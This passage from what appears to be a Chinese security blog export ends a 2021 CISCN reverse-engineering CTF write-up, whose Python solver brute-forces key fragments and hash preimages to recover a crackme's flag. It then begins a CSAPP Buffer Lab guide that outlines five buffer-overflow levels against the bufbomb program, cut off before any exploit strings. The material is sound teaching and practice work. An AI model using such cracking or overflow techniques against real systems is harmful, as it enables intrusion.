class="number">0xEA</span>, <span class="number">0xD7</span>, <span class="number">0x37</span>, <span class="number">0x24</span>, <span class="number">0x03</span>, <span class="number">0x0B</span>, <span class="number">0x2D</span>, <span class="number">0x0B</span>, <span class="number">0xEC</span>, <span class="number">0x8A</span>, <span class="number">0x9E</span>, <span class="number">0x99</span>, <span class="number">0xDD</span>]</span><br><span class="line"><span class="comment"># sub_401880(0xB5u, 0xC9u, (__int64)v10)</span></span><br><span class="line">DES(<span class="string">&#x27;ComeOn!!&#x27;</span>,STRING[<span class="number">66</span>:<span class="number">74</span>])==[<span class="number">0x52</span>, <span class="number">0x8E</span>, <span class="number">0xA9</span>, <span class="number">0x48</span>, <span class="number">0x4B</span>, <span class="number">0x59</span>, <span class="number">0xE4</span>, <span class="number">0x51</span>]</span><br><span class="line"><span class="comment"># sub_401880(0x9Du, 0x9Fu, (__int64)v11)</span></span><br><span class="line">MD5(STRING[<span class="number">74</span>:])==[<span class="number">0x2D</span>, <span class="number">0x4C</span>, <span class="number">0x4C</span>, <span class="number">0xAF</span>, <span class="number">0xB8</span>, <span class="number">0xE6</span>, <span class="number">0x64</span>, <span class="number">0xC0</span>, <span class="number">0x05</span>, <span class="number">0x56</span>, <span class="number">0xB0</span>, <span class="number">0x28</span>, <span class="number">0x06</span>, <span class="number">0xAB</span>, <span class="number">0x7E</span>, <span class="number">0x10</span>]</span><br></pre></td></tr></table></figure><p>之前的<code>STRING</code>是：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">STRING=INPUT[<span class="number">0</span>:<span class="number">4</span>]+<span class="string">&quot;\xf4\xa86\xd2&quot;</span>+INPUT[<span class="number">4</span>:<span class="number">12</span>]+<span class="string">&quot;\rh\xd3\xec\xef\xbcQhA\xd4\x0e\xf8)\x10)`\xf6\xb9y\x1aP\xe7&gt;\xec/\xca\xd3\xfc&quot;</span>+INPUT[<span class="number">12</span>:<span class="number">38</span>]+<span class="string">&quot;\x94Zm&#123;&quot;</span>+INPUT[<span class="number">38</span>:<span class="number">42</span>]</span><br></pre></td></tr></table></figure><p>对称密码部分都是爆破密钥（基本都是只用爆破4字节，其余是<code>STRING</code>的已知部分），哈希直接爆破（也是4字节），古典密码转换一下就好。</p><p>当时做题的时候是在可见字符范围（32,127）之间爆破的，爆破了两三组以后发现都是小写字母，所以后来直接用小写字母范围爆破会快很多；但没想到DES密钥这里有多解，导致一直没交上去，后来出了hint才知道有字符范围，那就是唯一解了&#x3D; &#x3D;。</p><p>这里为了方便复现就把exp的爆破范围改成hint给的<code>qwertyuiop</code>。</p><p>最后exp是：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5,sha256,sha1</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES,Blowfish,DES</span><br><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> MD2</span><br><span class="line"><span class="keyword">from</span> arc4 <span class="keyword">import</span> ARC4</span><br><span class="line"><span class="keyword">import</span> base58</span><br><span class="line"></span><br><span class="line">STRING=<span class="string">b&#x27;----\xf4\xa86\xd2--------\rh\xd3\xec\xef\xbcQhA\xd4\x0e\xf8)\x10)`\xf6\xb9y\x1aP\xe7&gt;\xec/\xca\xd3\xfc--------------------------\x94Zm&#123;----&#x27;</span></span><br><span class="line">flag=<span class="string">b&#x27;&#x27;</span></span><br><span class="line">charset=<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">ord</span>,<span class="string">&quot;qwertyuiop&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#STRING[:4]</span></span><br><span class="line">blowfish_arr=<span class="built_in">bytes</span>([<span class="number">0x06</span>, <span class="number">0x8F</span>, <span class="number">0x5A</span>, <span class="number">0xFF</span>, <span class="number">0xCB</span>, <span class="number">0xD6</span>, <span class="number">0xE9</span>, <span class="number">0x0B</span>])</span><br><span class="line"><span class="keyword">for</span> i1 <span class="keyword">in</span> charset:</span><br><span class="line">    <span class="keyword">for</span> i2 <span class="keyword">in</span> charset:</span><br><span class="line">        <span class="keyword">for</span> i3 <span class="keyword">in</span> charset:</span><br><span class="line">            <span class="keyword">for</span> i4 <span class="keyword">in</span> charset:</span><br><span class="line">                key=<span class="built_in">bytes</span>([i1,i2,i3,i4]+<span class="built_in">list</span>(STRING[<span class="number">4</span>:<span class="number">8</span>]))</span><br><span class="line">                blowfish=Blowfish.new(key,Blowfish.MODE_ECB)</span><br><span class="line">                <span class="keyword">if</span> blowfish.decrypt(blowfish_arr)==<span class="string">b&#x27;Decrypt!&#x27;</span>:</span><br><span class="line">                    print(<span class="string">b&quot;STRING[0:4] -&gt; &quot;</span>+key[:<span class="number">4</span>])</span><br><span class="line">                    flag+=key[:<span class="number">4</span>]</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#STRING[8:12]</span></span><br><span class="line">rot13_arr=<span class="built_in">bytes</span>([<span class="number">0x76</span>, <span class="number">0x72</span>, <span class="number">0x68</span>, <span class="number">0x64</span>])</span><br><span class="line">data=[]</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> rot13_arr:</span><br><span class="line">    tmp=x-<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    data.append((tmp+<span class="number">13</span>)%<span class="number">26</span>+<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line">flag+=<span class="built_in">bytes</span>(data)</span><br><span class="line">print(<span class="string">b&quot;STRING[8:12] -&gt; &quot;</span>+<span class="built_in">bytes</span>(data))</span><br><span class="line"></span><br><span class="line"><span class="comment">#STRING[12:44]</span></span><br><span class="line">aes_arr=<span class="built_in">bytes</span>([<span class="number">0xD1</span>, <span class="number">0x1F</span>, <span class="number">0xA5</span>, <span class="number">0x6A</span>, <span class="number">0xCE</span>, <span class="number">0x96</span>, <span class="number">0x26</span>, <span class="number">0x3A</span>, <span class="number">0x95</span>, <span class="number">0xD3</span>, <span class="number">0xFC</span>, <span class="number">0x60</span>, <span class="number">0xF7</span>, <span class="number">0x3D</span>, <span class="number">0x2D</span>, <span class="number">0xD2</span>])</span><br><span class="line"><span class="keyword">for</span> i1 <span class="keyword">in</span> charset:</span><br><span class="line">    <span class="keyword">for</span> i2 <span class="keyword">in</span> charset:</span><br><span class="line">        <span class="keyword">for</span> i3 <span class="keyword">in</span> charset:</span><br><span class="line">            <span class="keyword">for</span> i4 <span class="keyword">in</span> charset:</span><br><span class="line">                key=<span class="built_in">bytes</span>([i1,i2,i3,i4]+<span class="built_in">list</span>(STRING[<span class="number">16</span>:<span class="number">44</span>]))</span><br><span class="line">                aes=AES.new(key,AES.MODE_ECB)</span><br><span class="line">                <span class="keyword">if</span> aes.decrypt(aes_arr)==<span class="string">b&#x27;!!Successfully!!&#x27;</span>:</span><br><span class="line">                    print(<span class="string">b&quot;STRING[12:16] -&gt; &quot;</span>+key[:<span class="number">4</span>])</span><br><span class="line">                    flag+=key[:<span class="number">4</span>]</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#STRING[44:48]</span></span><br><span class="line">rc4_arr=<span class="built_in">bytes</span>([<span class="number">0x6F</span>, <span class="number">0xC5</span>, <span class="number">0xCF</span>, <span class="number">0x22</span>, <span class="number">0x4C</span>, <span class="number">0xFD</span>, <span class="number">0x49</span>, <span class="number">0xC2</span>, <span class="number">0x73</span>, <span class="number">0x4F</span>, <span class="number">0x4E</span>, <span class="number">0x99</span>, <span class="number">0xED</span>, <span class="number">0x71</span>, <span class="number">0x2D</span>, <span class="number">0xDD</span>, <span class="number">0x08</span>, <span class="number">0x58</span>, <span class="number">0x51</span>, <span class="number">0x5A</span>, <span class="number">0xD8</span>, <span class="number">0x38</span>, <span class="number">0xD1</span>, <span class="number">0x59</span>, <span class="number">0x2C</span>, <span class="number">0x2F</span>, <span class="number">0xE4</span>, <span class="number">0x4A</span>, <span class="number">0x66</span>, <span class="number">0x0F</span>])</span><br><span class="line"><span class="keyword">for</span> i1 <span class="keyword">in</span> charset:</span><br><span class="line">    <span class="keyword">for</span> i2 <span class="keyword">in</span> charset:</span><br><span class="line">        <span class="keyword">for</span> i3 <span class="keyword">in</span> charset:</span><br><span class="line">            <span class="keyword">for</span> i4 <span class="keyword">in</span> charset:</span><br><span class="line">                key=<span class="built_in">bytes</span>([i1,i2,i3,i4])</span><br><span class="line">                rc4=ARC4(key)</span><br><span class="line">                <span class="keyword">if</span> rc4.encrypt(rc4_arr)==<span class="string">b&#x27;You have made a huge progress!&#x27;</span>:</span><br><span class="line">                    print(<span class="string">b&quot;STRING[44:48] -&gt; &quot;</span>+key)</span><br><span class="line">                    flag+=key</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#STRING[48:52]</span></span><br><span class="line">sha1_arr=<span class="built_in">bytes</span>([<span class="number">0x65</span>, <span class="number">0xBC</span>, <span class="number">0xA7</span>, <span class="number">0xCC</span>, <span class="number">0x3A</span>, <span class="number">0x77</span>, <span class="number">0x1F</span>, <span class="number">0xFC</span>, <span class="number">0x55</span>, <span class="number">0xFE</span>, <span class="number">0x3A</span>, <span class="number">0xA3</span>, <span class="number">0x2A</span>, <span class="number">0xB4</span>, <span class="number">0x9C</span>, <span class="number">0x4B</span>, <span class="number">0xCA</span>, <span class="number">0xE3</span>, <span class="number">0x84</span>, <span class="number">0x91</span>])</span><br><span class="line"><span class="keyword">for</span> i1 <span class="keyword">in</span> charset:</span><br><span class="line">    <span class="keyword">for</span> i2 <span class="keyword">in</span> charset:</span><br><span class="line">        <span class="keyword">for</span> i3 <span class="keyword">in</span> charset:</span><br><span class="line">            <span class="keyword">for</span> i4 <span class="keyword">in</span> charset:</span><br><span class="line">                key=<span class="built_in">bytes</span>([i1,i2,i3,i4])</span><br><span class="line">                <span class="keyword">if</span> sha1(key).digest()==sha1_arr:</span><br><span class="line">                    print(<span class="string">b&quot;STRING[44:48] -&gt; &quot;</span>+key)</span><br><span class="line">                    flag+=key</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#STRING[52:58]</span></span><br><span class="line">b58_arr=<span class="built_in">bytes</span>([<span class="number">0x78</span>, <span class="number">0x57</span>, <span class="number">0x51</span>, <span class="number">0x79</span>, <span class="number">0x78</span>, <span class="number">0x4E</span>, <span class="number">0x36</span>, <span class="number">0x55</span>])</span><br><span class="line">print(<span class="string">b&quot;STRING[52:58] -&gt; &quot;</span>+base58.b58decode(b58_arr))</span><br><span class="line">flag+=base58.b58decode(b58_arr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#STRING[58:62]</span></span><br><span class="line">sha256_arr=<span class="built_in">bytes</span>([<span class="number">0x50</span>, <span class="number">0xC0</span>, <span class="number">0xCE</span>, <span class="number">0x77</span>, <span class="number">0xB9</span>, <span class="number">0xD0</span>, <span class="number">0x0D</span>, <span class="number">0x0F</span>, <span class="number">0x15</span>, <span class="number">0x9D</span>, <span class="number">0xC5</span>, <span class="number">0x63</span>, <span class="number">0x0F</span>, <span class="number">0x2D</span>, <span class="number">0xB4</span>, <span class="number">0x54</span>, <span class="number">0xC9</span>, <span class="number">0xC6</span>, <span class="number">0x43</span>, <span class="number">0x8F</span>, <span class="number">0xCD</span>, <span class="number">0x95</span>, <span class="number">0xF6</span>, <span class="number">0x3B</span>, <span class="number">0x73</span>, <span class="number">0x92</span>, <span class="number">0x9D</span>, <span class="number">0x6E</span>, <span class="number">0xA9</span>, <span class="number">0xF9</span>, <span class="number">0xAB</span>, <span class="number">0x40</span>])</span><br><span class="line"><span class="keyword">for</span> i1 <span class="keyword">in</span> charset:</span><br><span class="line">    <span class="keyword">for</span> i2 <span class="keyword">in</span> charset:</span><br><span class="line">        <span class="keyword">for</span> i3 <span class="keyword">in</span> charset:</span><br><span class="line">            <span class="keyword">for</span> i4 <span class="keyword">in</span> charset:</span><br><span class="line">                key=<span class="built_in">bytes</span>([i1,i2,i3,i4])</span><br><span class="line">                <span class="keyword">if</span> sha256(key).digest()==sha256_arr:</span><br><span class="line">                    print(<span class="string">b&quot;STRING[58:62] -&gt; &quot;</span>+key)</span><br><span class="line">                    flag+=key</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#STRING[62:66]</span></span><br><span class="line">md2_arr=<span class="built_in">bytes</span>([<span class="number">0xC6</span>, <span class="number">0x56</span>, <span class="number">0xA6</span>, <span class="number">0xEA</span>, <span class="number">0xD7</span>, <span class="number">0x37</span>, <span class="number">0x24</span>, <span class="number">0x03</span>, <span class="number">0x0B</span>, <span class="number">0x2D</span>, <span class="number">0x0B</span>, <span class="number">0xEC</span>, <span class="number">0x8A</span>, <span class="number">0x9E</span>, <span class="number">0x99</span>, <span class="number">0xDD</span>])</span><br><span class="line"><span class="keyword">for</span> i1 <span class="keyword">in</span> charset:</span><br><span class="line">    <span class="keyword">for</span> i2 <span class="keyword">in</span> charset:</span><br><span class="line">        <span class="keyword">for</span> i3 <span class="keyword">in</span> charset:</span><br><span class="line">            <span class="keyword">for</span> i4 <span class="keyword">in</span> charset:</span><br><span class="line">                key=<span class="built_in">bytes</span>([i1,i2,i3,i4])</span><br><span class="line">                <span class="keyword">if</span> MD2.MD2Hash(key).digest()==md2_arr:</span><br><span class="line">                    print(<span class="string">b&quot;STRING[62:66] -&gt; &quot;</span>+key)</span><br><span class="line">                    flag+=key</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#STRING[66:74]</span></span><br><span class="line">des_arr=<span class="built_in">bytes</span>([<span class="number">0x52</span>, <span class="number">0x8E</span>, <span class="number">0xA9</span>, <span class="number">0x48</span>, <span class="number">0x4B</span>, <span class="number">0x59</span>, <span class="number">0xE4</span>, <span class="number">0x51</span>])</span><br><span class="line"><span class="keyword">for</span> i1 <span class="keyword">in</span> charset:</span><br><span class="line">    <span class="keyword">for</span> i2 <span class="keyword">in</span> charset:</span><br><span class="line">        <span class="keyword">for</span> i3 <span class="keyword">in</span> charset:</span><br><span class="line">            <span class="keyword">for</span> i4 <span class="keyword">in</span> charset:</span><br><span class="line">                key=<span class="built_in">bytes</span>([i1,i2,i3,i4]+<span class="built_in">list</span>(STRING[<span class="number">70</span>:<span class="number">74</span>]))</span><br><span class="line">                des=DES.new(key,DES.MODE_ECB)</span><br><span class="line">                <span class="keyword">if</span> des.decrypt(des_arr)==<span class="string">b&#x27;ComeOn!!&#x27;</span>:</span><br><span class="line">                    print(<span class="string">b&quot;STRING[66:70] -&gt; &quot;</span>+key[:<span class="number">4</span>])</span><br><span class="line">                    flag+=key[:<span class="number">4</span>]</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#STRING[74:]</span></span><br><span class="line">md5_arr=<span class="built_in">bytes</span>([<span class="number">0x2D</span>, <span class="number">0x4C</span>, <span class="number">0x4C</span>, <span class="number">0xAF</span>, <span class="number">0xB8</span>, <span class="number">0xE6</span>, <span class="number">0x64</span>, <span class="number">0xC0</span>, <span class="number">0x05</span>, <span class="number">0x56</span>, <span class="number">0xB0</span>, <span class="number">0x28</span>, <span class="number">0x06</span>, <span class="number">0xAB</span>, <span class="number">0x7E</span>, <span class="number">0x10</span>])</span><br><span class="line"><span class="keyword">for</span> i1 <span class="keyword">in</span> charset:</span><br><span class="line">    <span class="keyword">for</span> i2 <span class="keyword">in</span> charset:</span><br><span class="line">        <span class="keyword">for</span> i3 <span class="keyword">in</span> charset:</span><br><span class="line">            <span class="keyword">for</span> i4 <span class="keyword">in</span> charset:</span><br><span class="line">                key=<span class="built_in">bytes</span>([i1,i2,i3,i4])</span><br><span class="line">                <span class="keyword">if</span> md5(key).digest()==md5_arr:</span><br><span class="line">                    print(<span class="string">b&quot;STRING[74:] -&gt; &quot;</span>+key)</span><br><span class="line">                    flag+=key</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#flag=STRING[:4]+STRING[8:16]+STRING[44:70]+STRING[74:]</span></span><br><span class="line">print(flag)</span><br><span class="line">print(<span class="string">&quot;flag&#123;&quot;</span>+md5(flag).hexdigest()+<span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line"><span class="comment"># b&#x27;epewieuqqwirrroewwyoowuowiptepquyeqiwepqer&#x27;</span></span><br><span class="line"><span class="comment"># flag&#123;9704622ee6d66a8789f39a43a6eac60e&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/p/wpFor-2021CISCNsemifinal/image-20210712111933001.png"></p><p>最后是提交md5（输出flag的部分做的也是md5处理，也可以直接输进程序里拿到flag：</p><p><img src="/p/wpFor-2021CISCNsemifinal/image-20210712112049762.png"></p><p><strong>flag：</strong>flag{9704622ee6d66a8789f39a43a6eac60e}</p>]]></content>
      
      
      <categories>
          
          <category> Write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Reverse </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【CSAPP】以CTFer的方式打开BufferLab</title>
      <link href="p/csappLAB-BufferLab/"/>
      <url>p/csappLAB-BufferLab/</url>
      
        <content type="html"><![CDATA[<p><strong>[WARNING]</strong> 本文是对CSAPP附带的Buffer Lab的究极指北，PWN小白趁机来练习使用pwntools和gdb &amp;&amp; 用老朋友IDA查看程序逻辑（可以说是抄小路了x。</p><a id="more"></a><blockquote><p>LAB链接：<a href="http://csapp.cs.cmu.edu/public/labs.html">CSAPP - Buffer Lab</a></p><p>任务说明书：<a href="https://raw.githubusercontent.com/zhwhong/Bufbomb_CSAPP/master/buflab.pdf">buflab.pdf</a></p><p>真正的指南：<a href="https://cloud.tencent.com/developer/article/1125616">Bufbomb缓冲区溢出攻击实验详解-CSAPP - 云+社区 - 腾讯云</a></p><hr><p>本文环境相关：</p><ul><li>IDA pro 7.5</li><li>Python 2.7.17</li><li>gdb 8.1.1 (插件使用pwndbg)</li><li>pwntools 4.4.0 (Python2的库)</li></ul></blockquote><h1 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h1><h2 id="任务说明"><a href="#任务说明" class="headerlink" title="任务说明"></a>任务说明</h2><p><code>BufBomb</code>分为5个关卡：</p><ul><li><code>Level 0 </code>: Candle<ul><li>Your task is to get <code>BUFBOMB</code> to execute the code for <code>smoke</code> when <code>getbuf</code> executes its return statement, rather than returning totest. If you succeed in doing that,  you will “light up the candle” and see the “smoke” of it. </li><li>通过缓冲区溢出使<code>getbuf()</code>返回时不是返回到<code>test()</code>，而是去执行<code>smoke()</code>。</li></ul></li><li><code>Level 1 </code>: Sparkler<ul><li>Similar to Level 0, your task is to get <code>BUFBOMB</code> to execute the code for <code>fizz</code> rather than returning to <code>test</code>. In this case, however, you must make it appear to <code>fizz</code> as if you have passed your cookie as its argument. How can you hear the <code>fizz</code> of your sparkler?</li><li>通过缓冲区溢出使<code>getbuf()</code>返回时带参执行<code>fizz()</code>，参数为用户的<code>cookie</code>。</li></ul></li><li><code>Level 2</code>: Firecracker<ul><li>Similar to Levels 0 and 1, your task is to get <code>BUFBOMB</code> to execute the code for <code>bang</code> rather than returning to <code>test</code>. Before this, however, you must set global variable <code>global_value</code> to your userid’s cookie. Your exploit code should set <code>global_value</code>, push the address of <code>bang</code> on the stack, and then execute a <code>ret</code> instruction to cause a jump to the code for <code>bang</code>.</li><li>通过缓冲区溢出使<code>getbuf()</code>返回时执行<code>bang()</code>，执行时需满足<code>global_value == cookie</code>。</li></ul></li><li><code>Level 3</code>: Dynamite<ul><li>Your job for this level is to supply an exploit string that will cause <code>getbuf</code> to return your cookie back to <code>test</code>, rather than the value 1. You can see in the code for <code>test</code> that this will cause the program to go <code>&quot;Boom!.&quot;</code>. Your exploit code should set your cookie as the return value, restore any corrupted state, push the correct return location on the stack, and execute a <code>ret</code> instruction to really return to <code>test</code>.</li><li>通过缓冲区溢出使<code>getbuf()</code>的返回值为用户的<code>cookie</code>而不是1，并且能正常返回到<code>test()</code>中，需注意<code>old ebp</code>的保存和复原。</li></ul></li><li><code>Level 4</code>: Nitroglycerin<ul><li>Your task is identical to the task for the Dynamite level. Once again, your job for this level is to supply an exploit string that will cause <code>getbufn</code> to return your cookie back to test, rather than the value 1. You can see in the code for test that this will cause the program to go <code>&quot;KABOOM!.&quot;</code>. Your exploit code should set your cookie as the return value, restore any corrupted state, push the correct return location on the stack, and execute a <code>ret</code> instruction to really return to <code>testn</code>.</li><li>需要进行五次攻击，每一次的场景与<code>Level 3</code>大致相同，只是每次的栈地址会发生改变。</li></ul></li></ul><h2 id="BufBomb使用"><a href="#BufBomb使用" class="headerlink" title="BufBomb使用"></a>BufBomb使用</h2><p>打开二进制文件<code>./bufbomb</code>可以看到help</p><p><img src="/p/csappLAB-BufferLab/image-20210622155315829.png"></p><p>需要输入对应参数，其中：</p><ul><li><code>-u &lt;userid&gt;</code>为必填，但可以随便填（最好一直用同一个userid）。</li><li><code>-n</code>开启最终关卡Level 4</li><li><code>-s</code>为lab自带的提交系统，本地做可以不用管</li><li><code>-h</code>打印help information</li></ul><p>也就是说：<strong>前面做<code>Level 0</code>~&#96;Level 3<code>的时候，启动程序的命令为</code>.&#x2F;bufbomb -u xxx<code>（其中xxx是userid，可以任选），到</code>Level 4<code>的时候命令则是</code>.&#x2F;bufbomb -u xxx -n&#96;，来开启Nitroglycerin关卡。</strong></p><p>（用IDA逆向时可以看到还有个参数是<code>-g</code>，加了这个参数会限定时间。不过这里help没提就不管了x）</p><h2 id="主流程解析"><a href="#主流程解析" class="headerlink" title="主流程解析"></a>主流程解析</h2><blockquote><p>如果只是为了完成这个Lab的5个Level，本部分可直接跳过，这里只是解析一下程序的启动过程，方便理解后续操作。</p></blockquote><p>用IDA打开<code>bufbomb</code>，从<code>main()</code>看起。</p><h3 